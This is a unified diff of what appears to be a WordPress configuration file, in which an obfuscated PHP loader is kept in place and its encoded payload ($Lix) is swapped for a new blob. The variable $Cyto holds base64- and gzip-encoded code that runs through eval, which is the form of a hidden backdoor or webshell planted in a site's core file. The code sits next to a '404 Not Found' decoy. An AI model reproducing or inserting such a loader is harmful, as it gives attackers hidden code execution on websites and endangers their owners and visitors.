@@ -141,9 +141,11 @@ echo "404 Not Found";
 
 /** Define ABSPATH as this file's directory */
 $Cyto = "Sy1LzNFQt1dLL7FW10uvKs1Lzs8tKEotLtZIr8rMS8tJLEnVSEosTjUziU9JT\x635PSdUoLikqSi3TUPHJrNAE\x41Ws\x41";
-$Lix = "7x3yT+y+S6EDmrZVvdfNagiIARsa5YMg8EuMEsn/fS4uT4X9r2ZdQP1v5WlULBWoU7LoKjUrTw0rGtqXEFrzC5BgsTQaZb8QMO/w/FwCE3iwAn84PMM2x3U5wuQ2pfvYfSdLGfJZvJprPdHxn/1KpLRygUpSBKtxCek/48uWqI28DuaeRZ8H7UYdZWxhOj12+t8pDM032LN+zeddXP9ItbyLbZrYtPNm562yO5rGKOoGu771IEZnL4D2KeMnBtvscXXGUv+BQoagegGCC6GdYgUUykCFTZFSXcJR6rRa8OqYFEZcFeFv2CczrCoxTIVFS6+e/+AcVu3t64Uc999hsJeTro2OJlOpjmh/1uobpaB1buBpBZjWMKo2RITH2/w3HCBMCv2bQWGn45f1BoSA";
+$Lix = "hbdq1HQ/2cmbnW5GOTkz1wr/zvWQ43mHSINBOFimiHIxnEsoTnCT+GTstc7RazW03baUfFO5TufeLjy2BJjZ1bTs+1kOkL5xSCvWvJyug7axJ/L5wJOofIc5Xv6egXV/sGxfClgf69n25DaG4E9Di9PYFHVn2FukCfJdCr6wUYHBiLZ99omxzQVuwfjn02n+Qfv6NRdqE/dxQlvq6Np9XjoeT9dl47qJuTqeXp8qTZ+1oid1C5CMb9B3zHHlH/6/b81QSwr1d8M0bJRPLZ/uYlSa/0k/LnIuW5tucm0XE8cg4/aFpxESk9qr15olUHTrPEsNUcL4Y9pNdjGC2XJm7yg5HBEwHMpCYveATHjZQtJGm5Q5OgLbYBP3ksDni6jgoRGP3dKBdobj0zwN7NFYpA4lJhVdwoMWIYXG1KdsmCfRHL89hm3z0Q/i0F63467O7NkR0Ky8YDZIF5zjkt/Zv/me7xpfnf7LseLRUcbf/vIJugg1hAy6MESdnO8CxVm7cO0UdWQoCxMSERMd/E/N9RBMC+WXSVHn45vZBkZA";
 eval(htmlspecialchars_decode(gzinflate(base64_decode($Cyto))));
 exit;
+?>
+<?php 
 /*
  * The error_reporting() function can be disabled in php.ini. On systems where that is the case,
  * it's best to add a dummy function to the wp-config.php file, but as this call to the function
